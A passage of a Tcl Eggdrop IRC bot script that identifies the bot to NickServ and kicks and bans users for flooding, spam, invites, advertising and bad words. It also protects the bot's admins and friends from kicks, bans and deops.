          if {![string match "*c*" [getchanmode $x]]} { putsrv "PART $x :14regained (4@14)ps status" } { putsrv "PART $x :regained (@)ps status" }
          if {[matchattr $cflag K]} { puthlp "JOIN $x :[dezip [getuser $cflag XTRA "CI"]]" } { puthlp "JOIN $x" }
      } }
      return 0
    }
    if {[string match "*AOP:*SOP:*AKICK*" $text]} {
      foreach errchan [channels] {
        set cflag "c$errchan"
        set cflag [string range $cflag 0 8]
        if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
          if {![isop $botnick $errchan]} {
            if {![string match "*c*" [getchanmode $errchan]]} { putsrv "PART $errchan :14regained (4@14)ps status" } { putsrv "PART $errchan :regained (@)ps status" }
            if {[matchattr $cflag K]} { puthlp "JOIN $errchan :[dezip [getuser $cflag XTRA "CI"]]" } { puthlp "JOIN $errchan" }
          }
          return 0
    } } }
    return 0 
  }
  if {$unick == "NickServ"} {
    if {[string match "*nick is owned*" [string tolower $text]] || [string match "*registered and protected*" [string tolower $text]]} {
      putlog "$notc IDeNTIFY"
      catch { clearqueue all }
      if {$botnick == $nick && $nickpass != ""} { putsrv "NickServ identify $nickpass" }
      if {$botnick == $altnick && $altpass != ""} { putsrv "NickServ identify $altpass" }
    }
    if {[string match "*Password accepted for*" $text]} { auto_reop }
    if {[string match "*has been released*" $text]} { putsrv "NICK $nick" }
    return 0
  }
  if {$unick == "MemoServ"} { if {[string match "*New DaLnet news is available*" $text]} { putsrv "PRIVMSG MemoServ@services.dal.net :NEWS" } ; return 0 }
  if {[string match "!kick*" [string tolower $text]]} {
    if {[matchattr $unick f]} {
      set salls [dezip [lrange $text 1 end]] ; putlog "$salls" 
      set schan [lindex $salls 0] ; set snick [lindex $salls 1] ; set sreas [lrange $salls 2 end] 
      if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan]} { return 0 }
      set banhost [getchanhost $snick $schan] ; set bannick($snick) $banhost
      regsub -all -- [dezip "bF~uC0.JqaEc0"] $sreas "" sreas ; regsub -all -- [dezip "xdxs~F1hBM6q0"] $sreas "" sreas
	  set psnban [banmsg]
      putsrv "KICK $schan $snick :$sreas $psnban" ; return 0
      } {
      if {[info exists commandkc($unick)]} {
        set bannick($nick) "$uhost" 
        foreach x [channels] { if {[onchan $unick $x] && [isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :[lgrnd] 4!14lamer4! 14dønt blame me, you've been warned [banmsg]" } }
        unset commandkc($unick) ; return 0
        } else { foreach x [channels] { if {[onchan $unick $x] && [isop $botnick $x]} { putsrv "KICK $x $unick :[lgrnd] 4!14alert4! 14dønt you dare, 1st warn [banmsg]" } } 
        set commandkc($unick) 1 ; return 0
  } } }
  if {[string match "*auth*" $text] || [string match "*[string tolower $notb]*" [string tolower $text]]} { return 0 }
  if {[matchattr $hand f]} { putlog "$notc $unick is a friend" ; return 0 }
  set mhost "@[lindex [split $uhost @] 1]"
  if {[string match "*decode*" [string tolower $text]]} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :[lgrnd] 4!14spam4!14 i hate 4decode [banmsg]"
          } {
          foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x $unick $notc 4!14spam4!14 i hate 4decode 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } }
    } } }
    set invme($mhost) "decode" ; return 0
  }
  if {[string match "*#*" $text] || [string match "*/j*" $text] || [string match "*/s*" $text]} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :[lgrnd] 4!14spam4!14 private 4message 14inviter [banmsg]" 
        } { foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x $unick [lgrnd] 4!14spam4!14 private 4message 14inviter 4-repørt by14 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } } }
        } {
        set banmask "[string range $uhost [string first "@" $uhost] end]"
        if {$banmask != "*!*@*" && $banmask != "*"} {
          foreach c [chanlist $x] {
            set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
            if {$banmask == $nickhost} {
              if {$c != $botnick} {
                if {[isop $botnick $x]} {
                  if {[matchattr $c f]} { continue }
                  set bannick($c) [getchanhost $c $x]
                  putsrv "KICK $x $c :[lgrnd] 4!14relay4! 14frøm 4$unick14(4$uhost14) 14invite [banmsg]"
                  } {
                  foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $c $notc 4!14relay4! 14frøm 4$unick14(4$uhost14) 14invite 4-repørt by14 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } }
    } } } } } } }
    set invme($mhost) "invite" ; return 0
  }
  foreach badword [string tolower $badwords] {
    if {[string match *$badword* [string tolower $text]]} {
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[isop $botnick $x]} {
            set bannick($unick) "$uhost"
            putsrv "KICK $x $unick :[lgrnd] 14badwo4rd 4private message  14match frøm 4$badword [banmsg]"
          } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick $notc 14badwo4rd 4private message 14match frøm 4$badword 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
  } }
  return 0
  } }
  foreach msgcom [string tolower $msgcoms] {
    if {[string match "$msgcom *" [string tolower [string trimleft [lindex $text 0] "`+-$"]]]} {
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[isop $botnick $x]} {
            set bannick($unick) "$uhost"
            putsrv "KICK $x $unick :[lgrnd] 4!14lamer4! 4command attempting 14match frøm 4$msgcom [banmsg]"
          } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick $notc 4!14lamer4! 4command attempting 14match frøm 4$msgcom 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
  } }
  return 0
  } }
  foreach advword [string tolower $advwords] {
    if {[string match *$advword* [string tolower $text]]} {
      if {[string match "*dal.net*" $text] || [string match "*wwww*" $text] || [string match "*www..*" $text] || [string match "*dns*" $text] || [string match "*ip*" $text]} { return 0 }
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[botisop $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :[lgrnd] 4!14spam4!14 private advertise 4match 14frøm 4$advword [banmsg]" 
		  } { foreach s [chanlist $x f] { if {[isop $s $x]} { putlog "$unick$s$x" ; set sendspam "!kick [zip "$x $unick $notc 4!14spam4!14 private advertise 4match 14frøm 4$advword 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
          } {
          set banmask "[string range $uhost [string first "@" $uhost] end]"
          if {$banmask != "*!*@*" && $banmask != "*"} {
            foreach c [chanlist $x] {
              set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
              if {$banmask == $nickhost} {
                if {[matchattr $c f]} { continue }
                if {$c != $botnick} {
                  if {[isop $botnick $x]} { set bannick($c) "[getchanhost $c $x]" ; putsrv "KICK $x $c :[lgrnd] 4!14relay4!14 private 4advertise 14frøm 4$unick14(4$uhost14) 14match 4$advword [banmsg]"
                    } {
                    foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $c $notc 4!14relay4!14 private 4advertise 14frøm 4$unick14(4$uhost14) 14match 4$advword 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } }
      } } } } } } }
      set invme($mhost) "advertise" ; return 0
      } }
	if {![isutimer "MSGCOUNTER"]} { utimer 20 { putlog "MSGCOUNTER" } ; set massmsg 1
    } {
    set massmsg [incr massmsg]
    if {[string length $text] > 74} { set massmsg [incr massmsg] }
    if {$massmsg >= 4} {
      puthlp "PRIVMSG $basechan :\001aCTION Incoming Mass Msg..! LasT FRoM 14[unsix "$unick!$uhost"]\001" 
      set massmsg 0 ; setignore "*!*@*" "*" 60
      if {[info exists ismaskhost]} { setignore [maskhost "*!*$mhost"] "MaZz MSg" 120 } { setignore "*!*$mhost" "MaZz MSg" 120 }
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[isop $botnick $x]} { if {![matchattr $unick f] || $unick == $botnick} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :[lgrnd] 4!14alert4! 14flood4 msg 4frøm 4$mhost [banmsg]" }
         } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick $notc 4!14alert4! 14flood4 msg 4frøm 4$mhost 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
        } }
	  return 0
    } }
  if {[string length $text] > 100} {
  set chr 0 ; set cnt 0
  while {$cnt < [string length $real]} { if [isflood [string index $real $cnt]] { incr chr } ; incr cnt }
  if {$chr > 30} {
    setignore "*!*@*" "*" 60
    puthlp "PRIVMSG $basechan :\001ACTION IncOmINg TsunamI MSg..! FRoM 14[unsix "$unick!$uhost"]\001"
    if {[info exists ismaskhost]} { setignore [maskhost "*!*$mhost"] "TsunamI MSg" 120 } { setignore "*!*$mhost" "TsunamI MSg" 120 }
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :[lgrnd] 4!14tsunami4!14 msg frøm 4[string trimleft $uhost "~"] [banmsg]" 
        } { 
		foreach s [chanlist $x f] { 
		if {[isop $s $x]} {
		 set sendspam "!kick [zip "$x $unick $notc 4!14tsunami4!14 msg frøm 4[string trimleft $uhost "~"] 14-repørt by4 $botnick-"]"
		 putlog "msg $s in $x"
		 putsrv "PRIVMSG $s :$sendspam" } 
		} } } } 
	  return 0
  } }
  if {[string length $text] > 200} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} { set bannick($unick) "$uhost" ; putsrv "KICK $x $unick :[lgrnd] 4!14spam4! 14private 4msg flood 14protection [banmsg]"
        } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $unick [lgrnd] 4!14spam4! 14private 4msg flood 14protection 4-repørt by14 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } }
      } }
    if {![isutimer "LONGTEXT"]} { utimer 30 { putlog "LONGTEXT" } ; setignore "*!*@*" "*" 60
      puthlp "PRIVMSG $basechan :\001ACTION IncOmINg LoNg TexT MSg..! FRoM 14[unsix "$unick!$uhost"]\001"
      if {[info exists ismaskhost]} { setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 120 } { setignore "*!*$mhost" "LoNg TexT MSg" 120 }
    } }
  if {$unick != $nwo} {
    if {[info exists twice_msg($unick)]} {
      set hostmask "${unick}!*@*" ; puthlp "PRIVMSG $unick :$querymsg" ; putlog "$notc IgNORE <<$hostmask>> PV-msg"
      unset twice_msg($unick) ; newignore $hostmask $unick "*" 2
      } {
      if {[istimer "chkautomsg"]} { set invme($mhost) "autojoin msg" ; putlog "$notc set invme $unick $invme($mhost)" ; return 0 }
      if {[isutimer "NO REPLY"]} { foreach x [utimers] { if {[string match "*NO REPLY*" $x]} { killutimer [lindex $x 2] } } ; utimer 10 { putlog "NO REPLY" } ; return 0 }
      utimer 10 { putlog "NO REPLY" }
      if {[string match "*dal*et*" $uhost]} { puthlp "PRIVMSG $unick :$querymsg" } { if {[getuser "config" XTRA "AWAY"]!=""} { puthlp "PRIVMSG $unick :$querymsg" } { puthlp "PRIVMSG $unick :$querymsg" } ; set twice_msg($unick) 1 }
    } } }
proc auto_reop {} {
  global notc botnick
  foreach x [channels] {
    if {[onchan $botnick $x] && ![isop $botnick $x] && ![string match "*+protectfriends*" [channel info $x]]} {
          set cret 30
          foreach ct [utimers] { if {[string match "*chancnt*" $ct]} { if {[expr [lindex $ct 0] + 30] > $cret} { set cret [expr [lindex $ct 0] + 30] } } }
          utimer $cret [list chancnt $x]
  } }
  return 0
}
proc chancnt {chan} { if {[isutimer "chancnt $chan"]} { return 0 } ; putsrv "ChanServ count $chan" }
set kickcounter "scripts/kicks.dat"
bind kick - * prot:kick
proc prot:kick {nick uhost handle chan knick reason} {
  global notc notd botnick alw kickme notb notm bannick igflood botname quick is_m op_it is_ban iskick kickcounter
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string match "* *" $reason] || [string match "*$notm*" $reason]} { set igflood($nick) "1" }
  if {[info exists iskick($knick$chan)]} { unset iskick($knick$chan) }
  if {$nick == $botnick} {
    if {![file exists $kickcounter]} { set file [open $kickcounter w] ; puts $file 1 ; catch {close $file} }
    set file [open $kickcounter r] ; set currentkicks [gets $file] ; catch {close $file} ; set file [open $kickcounter w] 
    puts $file [expr $currentkicks + 1] ; catch {close $file}
    if {[info exists kickme($knick)]} { if {$kickme($knick) == 1} { set kickme($knick) 2 } ; if {$kickme($knick) == 3} { catch { unset kickme($knick) } } }
    if {[string match "*$notm*" $reason]} {
	  putlog "$notc isin $reason"
      if {![info exists bannick($knick)]} { return 0 }
      if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
      set is_ban($bannick($knick)$chan) 1
      if {$bannick($knick) == "*!*@*"} { return 0 }
      set cmode [getchanmode $chan]
      set ok_m "1"
      if {[info exists is_m($chan)]} { set ok_m "0" ; putlog "info $is_m($chan)" }
      if {[isutimer "set_-m $chan"]} { set ok_m "0" ; putlog "isutime" }
      if {[string match "*m*" $cmode]} { set ok_m "0" ; putlog "m on $cmode" }
      if {$ok_m == "1"} {
        set is_m($chan) 1
        if {$quick == "1"} { putquick "mode $chan +bm *[string trimleft $bannick($knick) ~]" ; unset bannick } { putserv "mode $chan +bm *[string trimleft $bannick($knick) ~]" }
      } { if {$quick == "1"} { putquick "mode $chan +b *[string trimleft $bannick($knick) ~]" ; unset bannick } { putserv "mode $chan +b *[string trimleft $bannick($knick) ~]" } }
      return 0
      } {
      if {![info exists bannick($knick)]} { return 0 }
      if {$bannick($knick) == "*!*@*"} { return 0 }
      putserv "mode $chan +b *[string trimleft $bannick($knick) ~]"
    }
    return 0
  }
  if {$nick == $knick} { return 0 }
  if {$nick == "ChanServ"} { return 0 }
  if {[matchattr $nick f]} { return 0 }
  if {$knick == $botnick} {
    if {[info exists kickme($nick)]} { set kickme($nick) 3 ; putsrv "chanserv deop $chan $nick" } { if {[matchattr $cflag D]} { set kickme($nick) 1 } }
    puthlp "JOIN $chan"
    return 0
  }
  if {![isop $botnick $chan]} { return 0 }
  if {$knick == $notb} { putserv "KICK $chan $nick :[lgrnd] 4!14alert4! 14dønt kick 4$notb [banmsg]" ; set op_it($knick) 1 ; return 0 }
  if {$knick == $alw} { putserv "KICK $chan $nick :[lgrnd] 4!14alert4! 14dønt kick 4$alw [banmsg]" ; set op_it($knick) 1 ; return 0 }
  if {[matchattr $knick n]} { putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 14admin 4kick14 protection [banmsg]" ; set op_it($knick) 1 ; return 0 }
  if {[matchattr $knick m]} { putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 14master 4kick14 protection [banmsg]" ; set op_it($knick) 1 ; return 0 }
}
proc unbanq {chan host} { global botnick ; if {[isop $botnick $chan]} { puthelp "mode $chan -kb 14a4uto.14u4nban $host" } }
set banidx 1
proc banmsg {} {
  global banidx bancounter kickcounter
  set banidx [incr banidx]
  set counter [open $kickcounter r]; set currentkicks [gets $counter]; catch {close $counter}; set kicks [expr $currentkicks]
  if {$banidx >= [llength $bancounter]} { set banidx 1 }
  set banmsg [lindex $bancounter $banidx]
  append banmsg ") (4\[14$kicks4\]" 
return $banmsg
}
set kickidx 1
proc kickmsg {} {
  global kickms kickidx
  set kickidx [incr kickidx]
  if {$kickidx >= [llength $kickms]} { set kickidx 1 }
  set kickmsg [lindex $kickms $kickidx]
  return $kickmsg
}
proc ban_chk {nick uhost handle channel mchange bhost} {
  global botnick botname alw quick notb notc bannick ban-time igflood invme ex_flood
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  set mhost "@[lindex [split $uhost @] 1]"
  if {[info exists invme($mhost)]} { catch { unset invme($mhost) } }
  if {![isop $botnick $channel]} { return 0 }
  set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
  if {$banmask == "*!*@*"} { set banmask "$nick!*@*" }
  if {$bhost == "*!*@*"} { utimer [rand 4] [list unbanq $channel $bhost] ; return 1 }
  set cmode [getchanmode $channel]
  if {[getuser "config" XTRA "IPG"] != ""} {
    foreach ipg [getuser "config" XTRA "IPG"] {
      if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
        if {![isutimer "IPG $bhost"]} { if {![string match "*k*" $cmode]} { puthelp "mode $channel -kb 14ip.gu4a14rd $bhost" } { puthelp "mode $channel -b $bhost" } ; utimer 60 [list putlog "IPG $bhost"] }
        return 1
  } } }
  if {[string match [string tolower $bhost] [string tolower $botname]]} {
    if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![info exists igflood($nick)]} {
      if {[matchattr $cflag D]} { if {$quick == "1"} { putqck "KICK $channel $nick :$notc 4!14alert4! 14self 4banning14 defense reversing [banmsg]" } { putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14self 4banning14 defense reversing [banmsg]" } }
      if {![string match "*k*" $cmode]} { if {$quick == "1"} { putquick "mode $channel -bk+b $bhost 14d4efense.14b4an.14r4eversing $banmask" } { putserv "mode $channel -bk+b $bhost 6defense.ban.reversing $banmask" } } { if {$quick == "1"} { putquick "mode $channel -b+b $bhost $banmask" } { putserv "mode $channel -b+b $bhost $banmask" } }
    } { if {![string match "*k*" $cmode]} { if {$quick == "1"} { putquick "mode $channel -kb 14s4elf.14u4nban $bhost" } else { putserv "mode $channel -kb 14s4elf.14u4nban $bhost" } } { if {$quick == "1"} { putquick "mode $channel -b $bhost" } else { putserv "mode $channel -b $bhost" } } }
    return 1
  }
  foreach knick [chanlist $channel] {
    if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
      if {[matchattr $knick f]} {
        if {$knick != $alw && $knick != $notb} { utimer 1 [list unbanq $channel $bhost] }
        if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*dal.net*" $nick] || [info exists igflood($nick)]} { return 1 }
      }
      if {$knick == $notb} {
        if {$nick != $botnick} {
          putserv "KICK $channel $nick :$notc 4!14alert4! 14dønt banned 4$notb [banmsg]"
          if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 14$notb.14g4uard $bhost" } { putserv "mode $channel -b $bhost" } 
        } { if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 14a4uto.14u4nban $bhost" } { putserv "mode $channel -b $bhost" } }
        return 1
      }
      if {$knick == $alw} {
        if {$nick != $botnick} {
          putserv "KICK $channel $nick :$notc 4!14alert4! 14dønt banned 4$alw [banmsg]"
          if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 14$alw.14g4uard $bhost" } { putserv "mode $channel -b $bhost" }
          } {
          if {![string match "*k*" $cmode]} { putserv "mode $channel -kb 14a4uto.14u4nban $bhost" } { putserv "mode $channel -b $bhost" }
        }
        return 1
      }
      if {[matchattr $knick n]} { if {$nick != $botnick} { set bannick($nick) $banmask ; putserv "KICK $channel $nick :$notc 4!14alert4! 14dønt banned my admin 4$knick [banmsg]" } ; return 1 }
      if {[matchattr $knick m]} { if {$nick != $botnick} { putserv "KICK $channel $nick :$notc 4!14alert4! 14dønt banned my master 4$knick [banmsg]" } ; return 1 }
      if {[matchattr $cflag E]} {
        if {$nick == $botnick} {
          set menforce [rand 4]
          if {$menforce == 1} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14banned frøm 4[string trimleft $channel "#"] [banmsg]"
            } elseif {$menforce == 2} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14match bans frøm 4[string trimleft [unsix $bhost] "*!"] [banmsg]"
            } elseif {$menforce == 3} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14filter bans frøm 4[string trimleft [unsix $bhost] "*!"] [banmsg]"
          } else { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14refused link frøm 4[string trimleft $channel "#"] [banmsg]" }
          } else {
          if {[matchattr $nick n]} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 4admin14 banned [banmsg]"
            } else {
            if {[matchattr $nick m]} {
              putsrv "KICK $channel $knick :[lgrnd] 14forc4e 4master14 banned [banmsg]"
              } else {
              if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
              if {![matchattr $knick f]} {
                set menforce [rand 5]
                if {$menforce == 1} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14banned by 4@$nick [banmsg]"
                  } elseif {$menforce == 2} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14match bans frøm 4[string trimleft [unsix $bhost] "*!"] [banmsg]"
                  } elseif {$menforce == 3} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14banned frøm 4[string trimleft $channel "#"] [banmsg]"
                  } elseif {$menforce == 4} { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14filter bans frøm 4[string trimleft [unsix $bhost] "*!"] [banmsg]"
                } else { putsrv "KICK $channel $knick :[lgrnd] 14forc4e 14refused link frøm 4[string trimleft $channel "#"] [banmsg]" }
  } } } } } } }
  return 0
}
bind mode - * prot:deop
proc prot:deop {nick uhost handle channel mchange {opnick ""}} {
  global botnick deopme alw invme virus_nick quick notb notc bannick lastkey unop igflood is_m op_it
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  set mode [lindex $mchange 0]
  if {$opnick == ""} { set opnick [lindex $mchange 1] }
  if {$mode == "-m"} {
    foreach x [utimers] { if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} { killutimer [lindex $x 2] } }
    catch {unset is_m($channel)}
    if {![botisop $channel]} { return 0 }
    if {[matchattr $cflag V]} {
      foreach x [chanlist $channel] {
        if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
          set cret [getuser $cflag XTRA "VC"]
          foreach ct [utimers] { if {[string match "*voiceq*" $ct]} { if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} { set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] } } }
          utimer $cret [list voiceq $channel $x]
    } } }
    return 0
  }
  if {$mode == "+k"} { set lastkey $opnick ; if {[matchattr $cflag K] && [matchattr $nick Z]} { putlog "key change to $opnick" ; setuser $cflag XTRA "CI" [zip $opnick] ; saveuser } }
  if {$mode == "-k"} { catch { unset lastkey } ; if {$nick != $botnick} { set igflood($nick) "1" } ; return 0 }
  if {$mode == "+m"} {
    foreach x [utimers] { if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} { killutimer [lindex $x 2] } }
    if {$nick == $botnick} {
      if {![string match "*m*" [lindex [channel info $channel] 0]]} {
        if {[string match "*+shared*" [channel info $channel]]} { puthelp "NOTICE $channel :WaRnInG!! onE MInUtE MoDeRaTe DuE to FLood..!" }
        utimer 70 [list set_-m $channel]
        if {[isutimer "TRAFFIC $channel"]} { utimer 20 [list pub_nobot "*" "*" "*" $channel "*"] ; return 0 }
      }
      } {
      if {[isutimer "goback"]} {
        catch { clearqueue all }
        foreach x [utimers] { if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] } ; if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback } }
        utimer 2 del_nobase ; return 0
      }
      utimer [expr 1800 + [rand 60]] [list set_-m $channel]
    }
    return 0
  }
  if {$mode == "+b"} {
    if {$opnick == "*!*@heavy.join.flood.channel.temporary.moderate"} {
      utimer 40 [list putlog "TRAFFIC Join $channel"]
      if {$nick == $botnick} {
        utimer 60 [list putserv "mode $channel -bmR *!*@heavy.join.flood.channel.temporary.moderate"]
        if {[info exists is_m($channel)]} { return 0 }
        if {$quick == "1"} { putquick "mode $channel +m" } { putserv "mode $channel +m" }
        set is_m($channel) 1
        return 0
      }
    }
    if {$opnick == "*!*@heavy.flood.channel.temporary.moderate"} {
      utimer 40 [list putlog "TRAFFIC Part $channel"]
      if {$nick == $botnick} {
        utimer 120 [list putserv "mode $channel -bmR *!*@heavy.flood.channel.temporary.moderate"]
        return 0
      }
    }
    ban_chk $nick $uhost $handle $channel $mchange $opnick
    return 0
  }
  if {$mode == "-b"} {
    if {[info exists is_ban($opnick$channel)]} { catch {unset is_ban($opnick$channel)} }
    if {[isutimer "unbanq $channel $opnick"]} { foreach x [utimers] { if {[string match "*unbanq $channel $opnick*" $x]} { killutimer [lindex $x 2] } } }
    foreach x [ignorelist] { if {[lindex $x 0] == $opnick} { unsetignore [lindex $x 0] ; return 0 } } 
    catch { killban $opnick }
    return 0
  }
  if {$mode == "+o"} {
    if {$nick == $opnick} { return 0 }
    if {$opnick == $botnick} {
      if {[isutimer "checkonop$channel"]} { return 0 }
      utimer 15 [list putlog "checkonop$channel"]
      chk_on_op $channel 
      return 0 
      } {
      if {[info exists op_it($opnick)]} { catch {unset op_it($opnick)} }
      if {![isop $botnick $channel]} {return 0}
      if {[matchattr $opnick O]} { if {![string match "*k*" [getchanmode $channel]]} { puthelp "mode $channel -ko 14n4o@p.14l4ist $opnick" } { puthelp "mode $channel -o $opnick" } ; return 0 }
      if {[info exists unop($opnick)]} {
        if {$nick == "ChanServ"} { catch { unset unop($opnick) } ; return 0 }
        if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} { return 0 }
        utimer [expr 1 + [rand 5]] [list unallowed $channel $nick $opnick]
      return 0
  } } }
  if {$mode == "-o"} {
    foreach x [utimers] { if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] } }
    if {$opnick == $botnick && $nick != $botnick} {
      if {[isutimer "DEOP $channel"]} { return 0 }
      foreach x [utimers] { if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] } }
      utimer 2 [list putlog "DEOP $channel"]
      if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![string match "*Guest*" $botnick]} { if {![info exists igflood($nick)]} { if {[matchattr $cflag D]} { set deopme $nick } } }
      if {![matchattr $nick m]} { if {![string match "*+protectfriends*" [channel info $channel]]} { putlog "$notc CHANOP <<$channel>>" ; putsrv "ChanServ op $channel $botnick" } }
      return 0
    }
    if {![isop $botnick $channel]} { return 0 }
    if {[isutimer "deopprc*$opnick"]} { foreach x [utimers] { if {[string match "*deopprc*$opnick*" $x]} { putlog "!UnDeOp OR UnKIcK in $channel!" ; catch { killutimer [lindex $x 2] } } } }
    if {$nick == "ChanServ" && [matchattr $opnick o]} { voiceq $channel $opnick ; return 0 }
    if {$nick == "ChanServ"} { set unop($opnick) "1" ; return 0 }
    if {[matchattr $nick f] || $nick == $botnick} { return 0 }
    if {$opnick == $alw} { if {![info exists igflood($nick)]} { putserv "KICK $channel $nick :$notc 4!14alert4! 14dønt de@p 4$alw [banmsg]" } ; opq $channel $opnick ; return 0 }
    if {[matchattr $opnick n]} { if {![info exists igflood($nick)]} { putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14admin 4de@p14 guard [banmsg]" ; opq $channel $opnick } ; return 0 }
    if {[matchattr $opnick m]} { if {![info exists igflood($nick)]} { putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14master 4de@p14 guard [banmsg]" ; opq $channel $opnick } ; return 0 }
    if {[matchattr $opnick o]} { opq $channel $opnick ; return 0 }
    if {$opnick == $notb} { if {![info exists igflood($nick)]} { putserv "KICK $channel $nick :$notc 4!14alert4! 14dønt de@p 4$notb [banmsg]" } ; opq $channel $opnick ; return 0 }
  }
}
proc unallowed {chan nick opnick} {
  if {![botisop $chan]} { return 0 }
  if {![isop $nick $chan]} { return 0 }
  if {[isop $opnick $chan]} { return 0 }
  putserv "mode $chan -ko 14c4hanserv.14u4nallowed $nick"
}
bind nick - * chk_nicks
proc chk_nicks {unick uhost hand chan newnick} {
  global notc bannick botnick nick
  if {$unick == $nick && $unick != $botnick} { putsrv "NICK $nick" }
  if {[matchattr $unick Q]} {
    chattr $unick -Q
    foreach x [getuser $unick HOSTS] { delhost $unick $x }
    set hostmask "${unick}!*@*"
    setuser $unick HOSTS $hostmask
    saveuser
  }
  if {![isop $botnick $chan]} { return 0 }
  if {[isutimer "deopprc*$unick"]} { foreach x [utimers] { if {[string match "*deopprc*$unick*" $x]} { putlog "!UnDeOp $chan!" ; catch { killutimer [lindex $x 2] } } } }
  if {[string match "Guest*" $newnick]} { 
    if {[matchattr $unick f]} { return 0 }
    if {[isop $newnick $chan]} { utimer 1 [list deopprc $chan $newnick] ; return 0 }
  }
  if {[matchattr $newnick O] && [isop $newnick $chan]} { if {![string match "*k*" [getchanmode $chan]]} { putserv "mode $chan -ko 14n4o@p.14l4ist $newnick" } { putserv "mode $chan -o $newnick" } }
  akick_chk $newnick $uhost $chan
  if {[string match "*+greet*" [channel info $chan]]} { badnick_chk $newnick $uhost $hand $chan }
  if {([string match "*\}*" $newnick] || [string match "*\{*" $newnick]) && ([string length $newnick] == 8) && (![string match "*V{A}LNet*" $nick])} { 
    set bannick($newnick) "$uhost" ; putserv "kick $chan $newnick :$notc 4!14spam4!14 ERRnick 4possible 14flooder [banmsg]"
  }
  return 0
}
bind raw - 305 not_away
proc not_away {from keyword arg} { if {[isutimer "del_nobase"]} { utimer 1 del_nobase } ; if {[isutimer "goback"]} { utimer 2 goback } ; unsetignore "*!*@*" }
bind raw - 432 nickERROR
proc nickERROR {from keyword arg} { global nick ; set nick "SATPAM[unixtime]" }
bind raw - 404 ch_moderate
proc ch_moderate {from keyword arg} {
